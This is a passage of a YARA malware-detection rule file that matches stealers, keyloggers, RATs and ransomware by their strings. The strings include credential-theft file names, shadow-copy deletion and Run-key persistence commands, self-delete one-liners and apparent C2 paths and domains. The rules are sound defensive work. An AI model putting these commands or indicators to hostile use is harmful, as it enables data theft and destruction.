$s8 = "m_it.object_iterator != m_object->m_value.object->end()" fullword wide
$x1 = "endptr == token_buffer.data() + token_buffer.size()" fullword wide
$x2 = "\\json.hpp" wide
$x3 = "Microsoft_WinInet_" fullword wide
$x4 = "Microsoft_WinInet_*" fullword wide
condition:
uint16(0) == 0x5a4d and ((3 of ($x*) and 2 of ($s*)) or (4 of ($s*) and 1 of ($x*)))
}
rule SSC_Win_Tefosteal {
meta:
author = "ditekSHen"
description = "Tefosteal payload"
clamav_sig = "MALWARE.Win.Trojan.Tefosteal"
strings:
$s1 = "netsh wlan show networks mode=bssid" nocase fullword wide
$s2 = "LoginCredentialService.GetLoginCredentials$" ascii
$s3 = "DefaultLoginCredentials.LoginEventUsrPw$" ascii
$s4 = "SEC_E_NO_KERB_KEY" wide
$s5 = "TList<System.Zip.TZipHeader>." ascii
$s6 = "_Password.txt" fullword wide nocase
$s7 = "_Cookies.txt" fullword wide nocase
$f1 = "\\InfoPC\\BSSID.txt" wide
$f2 = "\\Files\\Telegram\\" wide
$f3 = "\\InfoPC\\Screenshot.png" wide
$f4 = "\\InfoPC\\Systeminfo.txt" wide
$f5 = "\\Steam\\config" wide
$f6 = "\\delete.vbs" wide
condition:
uint16(0) == 0x5a4d and 4 of ($s*) and 2 of ($f*)
}
rule SSC_Win_CryptoStealerGo {
meta:
author = "ditekSHen"
description = "CryptoStealerGo payload"
strings:
$s1 = "Go build ID: \"" ascii
$s2 = "file_upload.go" ascii
$s3 = "grequests.FileUpload" ascii
$s4 = "runtime.newproc" ascii
$s5 = "credit_cards" ascii
$s6 = "zip.(*fileWriter).Write" ascii
$s7 = "autofill_" ascii
$s8 = "XFxVc2VyIERhdGFcXA==" ascii
$s9 = "XFxBcHBEYXRhXFxMb2NhbFxc" ascii
condition:
uint16(0) == 0x5a4d and 8 of them
}
rule SSC_Win_M00nD3v {
meta:
author = "ditekSHen"
description = "M00nD3v keylogger payload"
strings:
$s1 = "M00nD3v Stub" ascii wide
$s2 = "M00nD3v{0}{1} Logs{0}{2} \\ {3}{0}{0}{4}" fullword wide
$s3 = "Anti-Keylogger Elite" wide
$s4 = "/C TASKKILL /F /IM" wide
$s5 = "echo.>{0}:Zone.Identifier" fullword wide
$s6 = "> Nul & Del \"{0}\" & start \"\" \"{1}.exe\"" wide
$s7 = "> Nul & start \"\" \"{1}.exe\"" wide
$s8 = "Stealer" fullword wide
$s9 = "{0}{0}++++++++++++{1} {2}++++++++++++{0}{0}" wide
$s10 = "{4}Application: {3}{4}URL: {0}{4}Username: {1}{4}Password: {2}{4}" wide
$s11 = "encrypted_key\":\"(?<Key>.+?)\"" wide
$s12 = "Botkiller" fullword ascii
$s13 = "AVKiller" fullword ascii
$s14 = "get_pnlPawns" fullword ascii
condition:
(uint16(0) == 0x5a4d and 6 of them) or (9 of them)
}
rule SSC_Win_VSSDestroy {
meta:
author = "ditekSHen"
description = "VSSDestroy/Matrix ransomware payload"
snort_sid = "920008-920009"
clamav_sig = "MALWARE.Win.Ransomware.VSSDestroy"
strings:
$o1 = "[SHARESSCAN]" wide
$o2 = "[LDRIVESSCAN]" wide
$o3 = "[LOGSAVED]" wide
$o4 = "[LPROGRESS]" wide
$o5 = "[FINISHSAVED]" wide
$o6 = "[ALL_LOCAL_KID]" wide
$o7 = "[DIRSCAN" wide
$o8 = "[GENKEY]" wide
$s1 = "\\cmd.exe" nocase wide
$s2 = "/C powershell \"" nocase wide
$s3 = "%COMPUTERNAME%" wide
$s4 = "%USERNAME%" wide
$s5 = "Error loading Socket interface (ws2_32.dll)!" wide
$s6 = "Old file list dump found. Want to load it? (y/n):" fullword wide
condition:
(uint16(0) == 0x5a4d and 4 of ($o*) and 3 of ($s*)) or (5 of ($o*) and 4 of ($s*))
}
rule SSC_Win_GoldenAxe {
meta:
author = "ditekSHen"
description = "GoldenAxe ransomware payload"
clamav_sig = "MALWARE.Win.Ransomware.GoldenAxe"
strings:
$s1 = "Go build ID: " ascii
$s2 = "taskkill.exe" ascii
$s3 = "cmd.exe" ascii
$s4 = "Speak.Speak" ascii
$s5 = "CLNTSRVRnull" ascii
$s6 = "-----END" ascii
$s7 = "-----BEGIN" ascii
$s8 = ".EncryptFile" ascii
$g1 = "GoldenAxe/Utils." ascii
$g2 = "GoldenAxe/Cryptography." ascii
$g3 = "GoldenAxe/Walker." ascii
$g4 = "C:/Users/alpha/go/src/GoldenAxe/" ascii
$g5 = "'Golden Axe ransomware'" ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) or (1 of ($g*) and 1 of ($s*)))
}
rule SSC_Win_Robbinhood {
meta:
author = "ditekSHen"
description = "Robbinhood ransomware payload"
clamav_sig = "MALWARE.Win.Ransomware.Robbinhood"
strings:
$go = "Go build ID:" ascii
$cmd1 = "cmd.exe /c" ascii
$cmd2 = "net use * /DELETE" nocase ascii
$cmd3 = "sc.exe stop" ascii
$cmd4 = "vssadmin resize shadowstorage" nocase ascii
$s1 = /Skipping\s(file|dir)/ ascii
$s2 = "Encrypt[ERR] GET Size:" ascii
$s3 = ".taskkilltasklistunknown(" ascii
$s4 = ".sysvssadmin.exewevtutil.exe MB released" ascii
$s5 = ".sysvssadmin.exewevtutil.exewinlogin.exewinlogon.exe MB released" ascii
$s6 = ".enc_robbinhood" ascii
$s7 = "c:\\windows\\temp\\pub.key" nocase ascii
$s8 = "main.CoolMaker" ascii
$s9 = "/valery/go/src/oldboy/" ascii
condition:
uint16(0) == 0x5a4d and ($go and 1 of ($cmd*) and 3 of ($s*))
}
rule SSC_JoeGo {
meta:
author = "ditekSHen"
description = "JoeGo ransomware payload"
clamav_sig = "MALWARE.Win.Ransomware.JoeGo"
strings:
$go = "Go build ID:" ascii
$s1 = "%SystemRoot%\\system32\\%v." ascii
$s2 = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V" ascii
$s3 = "/t REG_SZ /F /D %userprofile%\\" ascii
$s4 = "(sensitive) [recovered]" ascii
$s5 = "/dev/stderr/dev/stdout/index.html" ascii
$s6 = "%userprofile%\\SystemApps" ascii
$s7 = "p=<br>ACDTACSTAEDTAESTAKDTAKSTAWSTA" ascii
$cnc1 = "/detail.php" ascii
$cnc2 = "/checkin.php" ascii
$cnc3 = "/platebni_brana.php" ascii
$cnc4 = "://nebezpecnyweb.eu/" ascii
condition:
uint16(0) == 0x5a4d and $go and (all of ($s*) or (3 of ($s*) and 1 of ($cnc*)))
}
rule SSC_Win_Aurora {
meta:
author = "ditekSHen"
description = "Aurora ransomware payload"
strings:
$s1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" fullword ascii wide
$s2 = "#DECRYPT_MY_FILES#.txt" fullword ascii
$s3 = "/gen.php?generate=" fullword ascii
$s4 = "geoplugin.net/php.gp" ascii
$s5 = "/end.php?id=" fullword ascii
$s6 = "wotreplay" fullword ascii
$s7 = "moneywell" fullword ascii
$s8 = "{btc}" fullword ascii
$s9 = ".?AV_Locimp@locale@std@@" ascii
$s10 = ".?AV?$codecvt@DDU_Mbstatet@@@std@@" ascii
$s11 = ".?AU_Crt_new_delete@std@@" ascii
$pdb1 = "\\z0ddak\\Desktop\\source\\Release\\Ransom.pdb" ascii
$pdb2 = "\\Desktop\\source\\Release\\Ransom.pdb" ascii
condition:
uint16(0) == 0x5a4d and ((1 of ($pdb*) and 5 of ($s*)) or (8 of them))
}
rule SSC_Win_Buran {
meta:
author = "ditekSHen"
description = "Buran ransomware payload"
clamav_sig = "MALWARE.Win.Ransomware.Buran"
strings:
// Variant 1
$v1_1 = "U?$error_info_injector@V" ascii
$v1_2 = "Browse for Folder (FTP)" fullword ascii
$v1_3 = "Find/Replace in Files" fullword ascii
$v1_4 = "PAHKLM" fullword ascii
$v1_5 = "PAHKCR" fullword ascii
$v1_6 = "chkOpt_" ascii
$h1 = "Search <a href=\"location\" class=\"menu\">in this folder</a>" ascii
$h2 = "<br>to find where the text below" ascii
$h3 = "</a> files with these extensions (separate with semi-colons)" ascii
$h4 = "Need help with <a href=\"" ascii
$path = "\\work\\cr\\nata\\libs\\boost_" wide
// Variant 2
$v2_1 = "(ShlObj" fullword ascii
$v2_2 = "\\StreamUnit" fullword ascii
$v2_3 = "TReadme" fullword ascii
$v2_4 = "TDrivesAndShares" fullword ascii
$v2_5 = "TCustomMemoryStreamD" fullword ascii
$v2_6 = "OpenProcessToken" fullword ascii
$v2_7 = "UrlMon" fullword ascii
$v2_8 = "HttpSendRequestA" fullword ascii
$v2_9 = "InternetConnectA" fullword ascii
$v2_10 = "FindFiles" fullword ascii
$v2_12 = "$*@@@*$@@@$" ascii
condition:
uint16(0) == 0x5a4d and (((all of ($v1*) and 1 of ($h*)) or ($path and 2 of ($v1*) and 1 of ($h*)) or 10 of them) or all of ($v2*))
}
rule SSC_Win_MassLogger {
meta:
author = "ditekSHen"
description = "MassLogger keylogger payload"
strings:
$s1 = "MassLogger v" ascii wide
$s2 = "MassLogger Started:" ascii wide
$s3 = "MassLogger Process:" ascii wide
$s4 = "/panel/upload.php" wide
$s5 = "ftp://" wide
$s6 = "\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}" fullword wide
$s7 = "^(.*/)?([^/\\\\.]+/\\\\.\\\\./)(.+)$" fullword wide
$s8 = "Bot Killer" ascii
$s9 = "Keylogger And Clipboard" ascii
$c1 = "costura.ionic.zip.reduced.dll.compressed" fullword ascii
$c2 = "CHECKvUNIQUEq" fullword ascii
$c3 = "HOOK/MEMORY6" fullword ascii
$c4 = "Massfile" ascii wide
$c5 = "Fz=[0-9]*'skips*" fullword ascii
$c6 = ":=65535zO" fullword ascii
$c7 = "!$!%!&!'!(!)!*!.!/!0!4!" fullword ascii
$c8 = "5!9!:!<!>!@!E!G!J!K!L!N!O!P!`!" fullword ascii
$c9 = "dllToLoad" fullword ascii
$c10 = "set_CreateNoWindow" fullword ascii
$c11 = "FtpWebRequest" fullword ascii
$c12 = "encryptedUsername" fullword ascii
$c13 = "encryptedPassword" fullword ascii
condition:
(uint16(0) == 0x5a4d and 9 of ($c*)) or (5 of ($s*) or 9 of ($c*))
}
rule SSC_Win_Echelon {
meta:
author = "ditekSHen"
description = "Echelon information stealer payload"
strings:
$s1 = "<GetStealer>b__" ascii
$s2 = "clearMac" fullword ascii
$s3 = "path2save" fullword ascii
$s4 = "Echelon_Size" fullword ascii
$s5 = "Echelon Stealer by" wide
$s6 = "get__masterPassword" fullword ascii
$s7 = "DomainDetect" fullword ascii
$s8 = "[^\\u0020-\\u007F]" fullword wide
$s9 = "/sendDocument?chat_id=" wide
$s10 = "//setting[@name='Password']/value" wide
$s11 = "Passwords_Mozilla.txt" fullword wide
$s12 = "Passwords_Edge.txt" fullword wide
$s13 = "@madcod" ascii wide
$pdb = "\\Echelon-Stealer-master\\obj\\Release\\Echelon.pdb" ascii
condition:
(uint16(0) == 0x5a4d and (8 of ($s*) or $pdb)) or (8 of ($s*) or $pdb)
}
rule SSC_Win_Qulab {
meta:
author = "ditekSHen"
description = "Qulab information stealer payload or artifacts"
clamav_sig = "MALWARE.Win.Trojan.QulabZ-Stealer"
strings:
$x1 = "QULAB CLIPPER + STEALER" ascii wide
$x2 = "MASAD CLIPPER + STEALER" ascii wide
$x3 = "http://teleg.run/Qulab" ascii wide
$x4 = "http://teleg.run/jew_seller" ascii wide
$x5 = "BUY CLIPPER + STEALER" ascii wide
$s1 = "\\Screen.jpg" ascii wide
$s2 = "attrib +s +h \"" ascii wide
$s3 = "\\x86_microsoft-windows-" ascii wide
$s4 = "\\amd64_microsoft-windows-" ascii wide
$s5 = "Desktop TXT File" ascii wide
$s6 = "\\AutoFills.txt" ascii wide
$s7 = "\\CreditCards.txt" ascii wide
$s8 = "a -y -mx9 -ssw" ascii wide
$s9 = "\\Passwords.txt" ascii wide
$s10 = "\\Information.txt" ascii wide
$s11 = "\\getMe" ascii wide
condition:
9 of them or ((1 of ($x*) and 4 of ($s*)) or 1 of ($x*))
}
rule SSC_Win_Orion {
meta:
author = "ditekSHen"
description = "Orion Keylogger payload"
strings:
$s1 = "\\Ranger.BrowserLogging" ascii wide nocase
$s2 = "GrabAccounts" fullword ascii
$s3 = "DownloadFile" fullword ascii
$s4 = "Internet Explorer Recovery" wide
$s5 = "Outlook Recovery" wide
$s6 = "Thunderbird Recovery" wide
$s7 = "Keylogs -" wide
$s8 = "WebCam_Capture.dll" wide
$s9 = " is not installed on this computer!" wide
$s10 = "cmd /c bfsvc.exe \"" wide
$s11 = "/Keylogs - PC:" fullword wide
$s12 = "/PC:" fullword wide
$s13 = "<p style=\"color:#CC7A00\">[" wide
condition:
(uint16(0) == 0x5a4d and 5 of ($s*)) or (6 of ($s*))
}
rule SSC_Win_Aspire {
meta:
author = "ditekSHen"
description = "Aspire Keylogger payload"
strings:
$s1 = "AspireLogger -" wide
$s2 = "Application: @" wide
$s3 = "encryptedUsername" wide
$s4 = "encryptedPassword" wide
$s5 = "Fetch users fron logins" wide
$s6 = "URI=file:" wide
$s7 = "signons.sqlite" wide
$s8 = "logins.json" wide
condition:
(uint16(0) == 0x5a4d and 6 of ($s*)) or (7 of ($s*))
}
rule SSC_Win_S05Kitty {
meta:
author = "ditekSHen"
description = "Sector05 Kitty RAT payload"
strings:
$s1 = "Execute Comand" ascii
$s2 = "InjectExplorer" ascii
$s3 = "targetProcess = %s" fullword ascii
$s4 = "Process attach (%s)" fullword ascii
$s5 = "process name: %s" fullword ascii
$s6 = "cmd /c %s >%s" fullword ascii
$s7 = "CmdDown: %s, failed" fullword ascii
$s8 = "http://%s%s/%s" fullword ascii
$s9 = "tmp.LOG" fullword ascii
$x1 = "zerodll.dll" fullword ascii
$x2 = "OneDll.dll" fullword ascii
$x3 = "kkd.bat" fullword ascii
$x4 = "%s\\regsvr32.exe /s \"%s\"" fullword ascii
$x5 = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\fontchk.jse" fullword ascii
condition:
uint16(0) == 0x5a4d and (8 of ($s*) or all of ($x*))
}
rule SSC_Win_FakeWMI {
meta:
author = "ditekSHen"
description = "FakeWMI payload"
clamav_sig = "MALWARE.Win.Trojan.Fakewmi"
strings:
$s1 = "-BEGIN RSA PUBLIC KEY-" ascii
$s2 = ".exe|" ascii
$s3 = "cmd /c wmic " ascii
$s4 = "cmd /c sc " ascii
$s5 = "schtasks" ascii
$s6 = "taskkill" ascii
$s7 = "findstr" ascii
$s8 = "netsh interface" ascii
$s9 = "CreateService" ascii
condition:
uint16(0) == 0x5a4d and (all of ($s*) and #s2 > 10)
}
rule SSC_Win_Baldr {
meta:
author = "ditekSHen"
description = "Baldr payload"
clamav_sig = "MALWARE.Win.Trojan.Baldr"
strings:
$x1 = "BALDR VERSION : {0}" fullword wide
$x2 = "Baldr" fullword ascii wide
$x3 = "{0}\\{1:n}.exe" fullword wide
$x4 = ".doc;.docx;.log;.txt;" fullword wide
$s1 = "<GetMAC>b__" ascii
$s2 = "<ExtractPrivateKey3>b__" ascii
$s3 = "UploadData" fullword ascii
$s6 = "get_NetworkInterfaceType" fullword ascii
$s5 = "get_Passwordcheck" fullword ascii
condition:
(uint16(0) == 0x5a4d and all of ($x*)) or (2 of ($x*) and 4 of ($s*))
}
rule SSC_Win_Megumin {
meta:
author = "ditekSHen"
description = "Megumin payload"
clamav_sig = "MALWARE.Win.Trojan.Megumin"
strings:
$s1 = "loadpe|" fullword ascii
$s2 = "Megumin/2.0" fullword ascii
$s3 = "/c start /I \"\" \"" fullword ascii
$s4 = "jsbypass|" fullword ascii
$cnc1 = "Mozilla/5.0 (Windows NT 6.1) Megumin/2.0" fullword ascii
$cnc2 = "/cdn-cgi/l/chk_jschl?s=" fullword ascii
$cnc3 = "/newclip?hwid=" fullword ascii
$cnc4 = "/isClipper" fullword ascii
$cnc5 = "/task?hwid=" fullword ascii
$cnc6 = "/completed?hwid=" fullword ascii
$cnc7 = "/gate?hwid=" fullword ascii
$cnc8 = "/addbot?hwid=" fullword ascii
$pdb = "\\MeguminV2\\Release\\MeguminV2.pdb" ascii
condition:
(uint16(0) == 0x5a4d and (all of ($s*) or 5 of ($cnc*) or $pdb)) or 11 of them
}
rule SSC_Win_Rietspoof {
meta:
author = "ditekSHen"
description = "Rietspoof payload"
clamav_sig = "MALWARE.Win.Trojan.Rietspoof"
strings:
$c1 = "%s%s%s USER: user" fullword ascii
$c2 = "cmd /c %s" fullword ascii
$c3 = "CreateObject(\"Scripting.FileSystemObject\").DeleteFile(" ascii
$c4 = "WScript.Quit" fullword ascii
$c5 = "CPU: %s(%d)" fullword ascii
$c6 = "RAM: %lld Mb" fullword ascii
$c7 = "data.dat" fullword ascii
$c8 = "%s%s%s USER:" ascii
$v1_1 = ".vbs" ascii
$v1_2 = "HELLO" ascii
$v1_3 = "Wscript.Sleep" ascii
$v1_4 = "User-agent:Mozilla/5.0 (Windows; U;" ascii
$v2_1 = "Xjoepxt!" ascii
$v2_2 = "Content-MD5:%s" fullword ascii
$v2_3 = "M9h5an8f8zTjnyTwQVh6hYBdYsMqHiAz" fullword ascii
$v2_4 = "GET /%s?%s HTTP/1.1" fullword ascii
$v2_5 = "GET /?%s HTTP/1.1" fullword ascii
$pdb1 = "\\techloader\\loader\\loader.odb" ascii wide
$pdb2 = "\\loader\\Release\\loader_v1.0.pdb" ascii wide
condition:
uint16(0) == 0x5a4d and (7 of ($c*) and (3 of ($v*) or 1 of ($pdb*)))
}
rule SSC_Win_MoDiRAT {
meta:
author = "ditekSHen"
description = "MoDiRAT payload"
strings:
$s1 = "add_Connected" fullword ascii
$s2 = "Statconnected" fullword ascii
$s3 = "StartConnect" fullword ascii
$s4 = "TelegramTitleDetect" fullword ascii
$s5 = "StartTitleTelegram" fullword ascii
$s6 = "Check_titles" fullword ascii
$s7 = "\\MoDi RAT V" ascii
$s8 = "IsBuzy" fullword ascii
$s9 = "Recording_Time" fullword wide
condition:
(uint16(0) == 0x5a4d and 7 of them) or all of them
}
rule SSC_BAT_KoadicBAT {
meta:
author = "ditekSHen"
description = "Koadic post-exploitation framework BAT payload"
strings:
$s1 = "&@cls&@set" ascii
$s2 = /:~\d+,1%+/ ascii
condition:
uint32(0) == 0x4026feff and all of them and #s2 > 100
}
rule SSC_JS_KoadicJS {
meta:
author = "ditekSHen"
description = "Koadic post-exploitation framework JS payload"
strings:
$s1 = "window.moveTo(-" ascii
$s2 = "window.onerror = function(sMsg, sUrl, sLine) { return false; }" fullword ascii
$s3 = "window.onfocus = function() { window.blur(); }" fullword ascii
$s4 = "window.resizeTo(" ascii
$s5 = "window.blur();" fullword ascii
$hf1 = "<hta:application caption=\"no\" windowState=\"minimize\" showInTaskBar=\"no\"" fullword ascii
$hf2 = "<hta:application caption=\"no\" showInTaskBar=\"no\" windowState=\"minimize\" navigable=\"no\" scroll=\"no\""
$ht1 = "<hta:application" ascii
$ht2 = "caption=\"no\"" ascii
$ht3 = "showInTaskBar=\"no\"" ascii
$ht4 = "windowState=\"minimize\"" ascii
$ht5 = "navigable=\"no\"" ascii
$ht6 = "scroll=\"no\"" ascii
condition:
all of ($s*) and (1 of ($hf*) or all of ($ht*))
}
rule SSC_Win_NETEAGLE {
meta:
author = "ditekSHen"
description = "NETEAGLE backdoor payload"
strings:
$s1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" fullword ascii
$s2 = "System\\CurrentControlSet\\control\\ComputerName\\ComputerName" fullword ascii
$s3 = "Mozilla/4.0 (compatible; MSIE 5.0; Win32)" fullword ascii
$s4 = "/index.htm" fullword ascii
$s5 = "Help_ME" fullword ascii
$s6 = "GOTO ERROR" ascii
$s7 = "127.0.0.1" fullword ascii
$s8 = /pic\d\.bmp/ ascii wide
condition:
uint16(0) == 0x5a4d and 7 of them
}
rule SSC_WIN_BACKSPACE {
meta:
author = "ditekSHen"
description = "BACKSPACE backdoor payload"
strings:
$s1 = "Software\\Microsoft\\PnpSetup" ascii wide
$s2 = "Mutex_lnkword_little" ascii wide
$s3 = "(Prxy%c-%s:%u)" fullword ascii
$s4 = "(Prxy-No)" fullword ascii
$s5 = "/index.htm" fullword ascii
$s6 = "CONNECT %s:%d" ascii
$s7 = "\\$NtRecDoc$" fullword ascii
$s8 = "qazWSX123$%^" ascii
$s9 = "Software\\Microsoft\\Core" ascii wide
$s10 = "Mutex_lnkch" ascii wide
$s11 = "Event__lnkch__" ascii wide
$s12 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)" fullword ascii
$s13 = "User-Agent: Mozilla/5.00 (compatible; MSIE 6.0; Win32)" fullword ascii
condition:
uint16(0) == 0x5a4d and 8 of them
}
rule SSC_Win_PillowMint {
meta:
author = "ditekSHen"
description = "PillowMint POS payload"
strings:
$s1 = "system32\\sysvols\\" ascii nocase
$s2 = "Sysnative\\sysvols\\" ascii nocase
$s3 = "critical.log" fullword ascii
$s4 = "log.log" fullword ascii
$s5 = "commands.txt" fullword ascii
$s6 = "_EV0LuTi0N_" ascii
$s7 = /(file|reg)\scmd:/ fullword ascii
$s8 = "dumper_nologs_" ascii
$s9 = "ReflectiveLoader" ascii
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_GoldenSpy {
meta:
author = "SpiderLabs Trustwave"
description = "GoldenSpy dropper payload"
reference = "https://trustwave.azureedge.net/media/16908/the-golden-tax-department-and-emergence-of-goldenspy-malware.pdf"
strings:
$reg = "Software\\IDG\\DA" nocase wide ascii // registry entry
$str1 = "requestStr" nocase wide ascii // POST request the machine details with this parameter
$str2 = "nb_app_log_mutex" nocase wide ascii // Mutex
$str3 = { 510F4345[0-10]50518D8DCCFE[0-20]837D1C[0-20]8D45[0-15]0F4345[0-20]505157 } // Data collection and passed to requestStr in POST
condition:
(uint16(0) == 0x5A4D) and $reg and 2 of ($str*)
}
rule SSC_Win_Plurox {
meta:
author = "ditekSHen"
description = "Plurox backdoor payload"
strings:
$s1 = "autorun.c" fullword ascii
$s2 = "launcher.c" fullword ascii
$s3 = "loader.c" fullword ascii
$s4 = "stealth.c" fullword ascii
$s5 = "RunFromMemory" fullword ascii
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_Avalon {
meta:
author = "ditekSHen"
description = "Avalon infostealer payload"
strings:
$s1 = "Parsecards" fullword ascii
$s2 = "Please_Gofuckyouself" fullword ascii
$s3 = "GetDomainDetect" fullword ascii
$s4 = "GetTotalCommander" fullword ascii
$s5 = "KnownFolder" fullword ascii
$s6 = "set_hidden" fullword ascii
$s7 = "set_system" fullword ascii
$l1 = "\\DomainDetect.txt" wide
$l2 = "\\Grabber_Log.txt" wide
$l3 = "\\Programs.txt" wide
$l4 = "\\Passwords_Edge.txt" wide
$l5 = "\\KL.txt" wide
$w1 = "dont touch" fullword wide
$w2 = "Grabber" fullword wide
$w3 = "Keylogger" fullword wide
$w4 = "password-check" fullword wide
$w5 = "H4sIAAAAAAAEA" wide
$p1 = "^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$" wide
$p2 = "^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$" wide
condition:
uint16(0) == 0x5a4d and 8 of them
}
rule SSC_Linux_Kinsing {
meta:
author = "ditekSHen"
description = "Kinsing RAT payload"
strings:
$s1 = "backconnect" ascii
$s2 = "connectForSocks" ascii
$s3 = "downloadAndExecute" ascii
$s4 = "download_and_exec" ascii
$s5 = "masscan" ascii
$s6 = "UpdateCommand:" ascii
$s7 = "exec_out" ascii
$s8 = "doTask with type %s" ascii
condition:
uint16(0) == 0x457f and 6 of them
}
rule SSC_Win_Avaddon {
meta:
author = "ditekSHen"
description = "Avaddon ransomware payload"
strings:
$s1 = "\\IMAGEM~1.%d\\VISUA~1\\BIN\\%s.exe" ascii
$s2 = "\\IMAGEM~1.%.2d-\\VISUA~1\\BIN\\%s.exe" ascii
$s3 = "\\IMAGEM~1.%d-Q\\VISUA~1\\BIN\\%s.exe" ascii
$s4 = "\\IMAGEM~1.%d\\%s.exe" ascii
$s5 = "EW6]>mFXDS?YBi?W5] CY 4Z8Y BY7Y BZ8Z CY7Y AY8Z CZ8Y!Y:Z" ascii
$s6 = "FY  AY 'Z      ;W      @Y  @Y 'Z    Y  @Y (Z" ascii
$s7 = "\"rcid\":\"" fullword ascii
$s8 = "\"ip\":\"" fullword ascii wide
$s9 = ".?AUANEventIsGetExternalIP@@" fullword ascii
$s10 = ".?AUANEventGetCpuMax@@" fullword ascii
condition:
uint16(0) == 0x5a4d and 8 of them
}
rule SSC_Win_ProLock {
meta:
author = "ditekSHen"
description = "ProLock ransomware payload"
clamav_sig = "MALWARE.Win.Ransomware.ProLock"
strings:
$s1 = ".flat" fullword ascii
$s2 = ".data" fullword ascii
$s3 = ".api" fullword ascii
$s4 = "RtlZeroMemory" fullword ascii
$s5 = "LoadLibraryA" fullword ascii
$s6 = "Sleep" fullword ascii
$s7 = "lstrcatA" fullword ascii
$s8 = { 55 89 E5 8B 45 08 EB 00 89 45 EC 8D 15 4F 10 40 00 8D 05 08 10 40 00 83 E8 08 29 C2 8B 45 EC 01 C2 31 }
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_PurpleWave {
meta:
author = "ditekSHen"
description = "PurpleWave infostealer payload"
strings:
$s1 = "/loader/" fullword ascii
$s2 = "\\load_" fullword wide
$s3 = "boundaryaswell" fullword ascii
$s4 = "[passwords]" ascii
$s5 = "[is_encrypted]" ascii
$s6 = "[cookies]" ascii
$s7 = ".?AVMozillaBrowser@@" fullword ascii
$s8 = ".?AVChromeBrowser@@" fullword ascii
$s9 = ".?AV?$money" ascii
$s10 = "at t.me/LuckyStoreSupport" ascii
condition:
uint16(0) == 0x5a4d and 7 of them
}
rule SSC_Java_Pyrogenic {
meta:
author = "ditekSHen"
description = "Pyrogenic/Qealler infostealer payload"
strings:
$s1 = "bbb6fec5ebef0d93" ascii wide
$s2 = "2a898bc98aaf6c96f2054bb1eadc9848eb77633039e9e9ffd833184ce553fe9b" ascii wide
$s3 = "addShutdownHook" ascii wide
$s4 = "obfuscated/META-INF/QeallerV" ascii wide
$s5 = "globalIpAddress" ascii wide
condition:
all of them
}
rule SSC_Win_Taurus {
meta:
author = "ditekSHen"
description = "Taurus infostealer payload"
strings:
$s1 = "t.me/taurus_se" ascii
$s2 = "rus_seller@explo" ascii
$s3 = "/c timeout /t 3  & del /f /q" ascii
$s4 = "MyAwesomePrefix" ascii
$txt1 = "LogInfo.txt" fullword ascii
$txt2 = "Information.txt" fullword ascii
$txt3 = "General\\passwords.txt" fullword ascii
$txt4 = "General\\forms.txt" fullword ascii
$txt5 = "General\\cards.txt" fullword ascii
$txt6 = "Installed Software.txt" fullword ascii
$txt7 = "Crypto Wallets\\WalletInfo.txt" fullword ascii
$txt8 = "cookies.txt" fullword ascii
$url1 = "/cfg/" wide
$url2 = "/loader/complete/" wide
$url3 = "/log/" wide
$url4 = "/dlls/" wide
$upat = /\.exe;;;\d;\d;\d\]\|\[http/
$x1 = "Vaultcli.dll" fullword ascii
$x2 = "Bcrypt.dll" fullword ascii
$x3 = "*.localstor" ascii
$x4 = "operator<=>" fullword ascii
$x5 = ".data$rs" fullword ascii
$x6 = "https_discordap" ascii
$o1 = { 53 56 8b 75 08 8d 85 64 ff ff ff 57 6a ff 6a 01 }
$o2 = { 6a 00 68 00 04 00 00 ff b5 a8 fe ff ff ff b5 ac }
$o3 = { ff 75 0c 8d 85 44 ff ff ff 50 e8 aa f7 ff ff 8b }
$o4 = { 8b 47 04 c6 40 19 01 8d 85 6c ff ff ff 8b 0f 50 }
$o5 = { 8d 8d ?? ff ff ff e8 5b }
condition:
((3 of ($s*) or (6 of ($txt*) and 2 of ($s*)) or ($upat and 1 of ($s*) and 2 of ($txt*)) or (all of ($url*) and (2 of ($txt*) or 1 of ($s*)))) or (uint16(0) == 0x5a4d and all of ($x*) or (all of ($o*) and 3 of ($x*))))
}
rule SSC_Win_RemoteUtilitiesRAT {
meta:
author = "ditekSHen"
description = "RemoteUtilitiesRAT RAT payload"
clamav_sig = "MALWARE.Win.Trojan.RemoteUtilitiesRAT"
strings:
$s1 = "rman_message" wide
$s2 = "rms_invitation" wide
$s3 = "rms_host_" wide
$s4 = "rman_av_capture_settings" wide
$s5 = "rman_registry_key" wide
$s6 = "rms_system_information" wide
$s7 = "_rms_log.txt" wide
$s8 = "rms_internet_id_settings" wide
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_SlothfulMedia {
meta:
author = "ditekSHen"
description = "SlothfulMedia backdoor payload"
strings:
$x1 = /ExtKeylogger(Start|Stop)/ fullword ascii
$x2 = /ExtService(Add|Delete|Start|Stop)/ fullword ascii
$x3 = /ExtRegKey(Add|Del)/ fullword ascii
$x4 = /ExtRegItem(Add|Del)/ fullword ascii
$x5 = "ExtUnload" fullword ascii
$s1 = "Local Security Process" fullword wide
$s2 = "Global%s%d" fullword wide
$s3 = "%s%s_%d.dat" fullword wide
$s4 = "\\AppIni" fullword wide
$s5 = "%s.tmp" fullword wide
$s6  = "\\SetupUi" fullword wide
$s7 = "%s|%s|%s|%s" fullword wide
$s8 = "\\ExtInfo" fullword wide
$cnc1 = "/v?m=" fullword ascii
$cnc2 = "%s&i=%d" fullword ascii
$cnc3 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75" fullword ascii
$cnc4 = "Content-Length: %d" fullword ascii
condition:
uint16(0) == 0x5a4d and (3 of ($x*) or 7 of ($s*) or all of ($cnc*) or (1 of ($x*) and 4 of ($s*)))
}
rule SSC_Win_IRCBot {
